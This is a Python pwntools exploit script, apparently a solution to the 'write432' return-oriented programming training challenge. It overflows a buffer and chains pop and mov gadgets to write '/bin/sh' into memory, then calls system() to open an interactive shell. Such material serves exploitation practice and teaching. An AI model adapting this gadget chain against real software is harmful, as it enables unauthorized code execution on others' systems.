import sys; sys.path.append("../..")
import shared_pwn
from pwn import *
import re

BINARY_NAME = "write432"
BUFFER_LEN = 44

junk = b"\x90" * BUFFER_LEN

def write_string_to_memory(start_addr, string_data, g_pop, g_mov):

    # Pads the string
    required = abs((len(string_data) % 4) - 4)
    string_data += " " * required

    if len(string_data) % 4 != 0: raise Exception("String length incorrect")

    # Split the string into sets of 4
    chunks = re.findall(r"....", string_data)

    # Writes data to memory
    payload = b""
    for c in chunks:
        payload += g_pop
        payload += p32(start_addr)
        payload += str.encode(c)
        payload += g_mov

        # Increment the address each time
        start_addr += 4

    return payload

# Pointers
string_location =     0x0804a028    # readelf -x .data write432
g_pop_pop       = p32(0x080486da)   # pop edi ; pop ebp ; ret
g_mov           = p32(0x8048670)    # mov dword ptr [edi], ebp ; ret
system_func     = p32(0x08048430)

# Payload creation
payload = b""
payload += junk
payload += write_string_to_memory(string_location, "/bin/sh", g_pop_pop, g_mov) 
payload += system_func
payload += p32(0x90) # exit addr
payload += p32(string_location)

elf = ELF(f"./{BINARY_NAME}")
io = elf.process()
io.recvuntil("> ")
io.send(payload)
io.send("\n")

io.interactive()
# shared_pwn._recvall(io)

# sys.stdout.buffer.write(payload)